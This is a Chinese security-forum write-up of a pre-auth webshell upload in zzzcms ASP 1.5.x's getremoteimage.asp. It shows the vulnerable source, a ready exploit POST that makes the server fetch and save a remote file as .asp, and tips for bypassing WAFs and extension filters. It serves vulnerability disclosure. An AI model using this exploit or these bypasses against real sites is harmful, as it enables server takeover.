# zzzcms(asp)前台Getshell

zzzcms > 1.5版本后台添加了/inc/webuploader/目录 参照Ueditor功能  
问题文件/admin{}/inc/webuploader/getremoteimage.asp(1.5.0版本)   

```asp
<!--#include file="../../../inc/zzz_class.asp"-->
<%
dim remotestr,remotepic,remotesplit,j,newpath,newpicname,newimg,newimgs,upfolder,parentPath
upfolder=getform("upfolder","both")
if isnul(upfolder) then 
 parentPath=sitepath&upLoadPath
else
 parentPath=sitepath&upLoadPath&upfolder&"/"
end if

remotestr =Trim(Request("file"))
remotestr=replace(remotestr,"&amp;" , "&")
remotestr=remotestr
remotestr=remotestr&"ue_separate_ue"
remotesplit=split(remotestr,"ue_separate_ue")
newpath=parentPath&DateFormat(now,"yymmdd")&"/"
NewFolder newpath
for j=0 to ubound(remotesplit)-1
        newpicname=getrndname()&GetFileExt(remotesplit(j))        
        newimg=SaveRemoteFile(newpath&newpicname,remotesplit(j))
        if waterMark=1 then waterMarkImg newimg
        newimgs=newimgs&newimg&"ue_separate_ue"
next
if remotestr<>"" then
        if right(newimgs,len("ue_separate_ue"))="ue_separate_ue" then newimgs=left(newimgs,len(newimgs)-len("ue_separate_ue"))
end if
   response.Write "{'url':'"&newimgs&"','tip':'远程图片抓取成功！','srcUrl':'"&remotestr& "'}"

function getfileExt(filename)
if filename="" then getfileExt=".jpg"        :        exit function
getfileExt=mid(filename,InStrRev(filename,"."),len(filename))'获取文件扩展名
end function


'================================================== 
'过程名：SaveRemoteFile 
'作 用：保存远程的文件到本地 
'参 数：LocalFileName ------ 本地文件名 
'参 数：RemoteFileUrl ------ 远程文件URL 
'================================================== 
function SaveRemoteFile(LocalFileName,RemoteFileUrl) 
        On Error Resume Next        
        dim Ads,Retrieval,GetRemoteData 
        Set Retrieval = Server.CreateObject("Microsoft.XMLHTTP") 
        With Retrieval 
        .Open "Get", RemoteFileUrl, False, "", "" 
        .Send 
        GetRemoteData = .ResponseBody 
        End With 
        Set Retrieval = Nothing 
        Set Ads = Server.CreateObject("Adodb.Stream") 
        With Ads 
        .Type = 1 
        .Open 
        .Write GetRemoteData 
        .SaveToFile server.MapPath(LocalFileName),2 
        .Cancel() 
        .Close() 
        End With 
        Set Ads=nothing 
        SaveRemoteFile=LocalFileName
end function 

'判断远程图片是否存在
function CheckURL(byval A_strUrl)
        On Error Resume Next
        set XMLHTTP = Server.CreateObject("Microsoft.XMLHTTP")
        XMLHTTP.open "HEAD",A_strUrl,false
        XMLHTTP.send()
        CheckURL=(XMLHTTP.status=200)
        set XMLHTTP = nothing
end function
%>
```

对比后台所有文件缺失了后台权限验证包含

```
<!--#include file="../../../inc/zzz_admin.asp" -->
```

问题文件/admin{}/inc/webuploader/getremoteimage.asp(1.5.4版本)

```asp
<!--#include file="../../../inc/zzz_class.asp"-->
<%
dim remotestr,remotepic,remotesplit,j,newpath,newpicname,newimg,newimgs,upfolder,parentPath
upfolder=getform("upfolder","both")
if isnul(upfolder) then
 parentPath=sitepath&upLoadPath
else
 parentPath=sitepath&upLoadPath&upfolder&"/"
end if
        remotestr =Trim(Request("file"))
        remotestr=replace(remotestr,"&amp;" , "&")
        remotestr=remotestr
        remotestr=remotestr&"ue_separate_ue"
        remotesplit=split(remotestr,"ue_separate_ue")
        newpath=parentPath&DateFormat(now,"yymmdd")&"/"
        NewFolder newpath
for j=0 to ubound(remotesplit)-1
        newpicname=getrndname()&"."&GetFileExt(remotesplit(j))        
        newimg=SaveRemoteFile(newpath&newpicname,remotesplit(j))
        if waterMark=1 then waterMarkImg newimg
        newimgs=newimgs&newimg&"ue_separate_ue"
next
  remotestr=endstr(remotestr,"ue_separate_ue")
  echo "{'url':'"&newimgs&"','tip':'远程图片抓取成功！','srcUrl':'"&remotestr& "'}"
%>
```

看到这段自定义的echo  

```
echo "{'url':'"&newimgs&"','tip':'远程图片抓取成功！','srcUrl':'"&remotestr& "'}"
```

可以猜测PHP开发者参照ASP.NET的Ueditor写出了ASP的代码  
EXP:  

```
POST:
/{admin}/inc/webuploader/getremoteimage.asp

file=http://target.com/*.gif?.asp
```

SHELL在返回包
影响版本zzzcms(ASP)1.5.0/1.5.1/1.5.2/1.5.3/1.5.4
值得一提的是zzzcms ASP版安装完成后默认后台为随机
想要利用需要获得后台地址/admin{随机目录}/inc/webuploader/getremoteimage.asp

测试发现这个随机后台是个摆设 有兴趣的可以研究研究

一些tips:

```
.txt?.a*sp.a*sp有时候抓取不到 得先传图片马到他本地再抓本机还有的只能抓https 不支持http
其实不光?可以 *也可以 基本上给予关键词拦截的waf 用星号都可以绕过
q:新年快乐，流光师傅。 测试了下txt能post上去，asp后缀无法直接po上去，请问怎么突破。
a:.txt?.asp
```

注：原文地址：https://www.t00ls.net/articles-59726.html 作者：@[赢时胜流光](https://www.t00ls.net/members-profile-12455.html)    

欢迎大家投稿吐司！

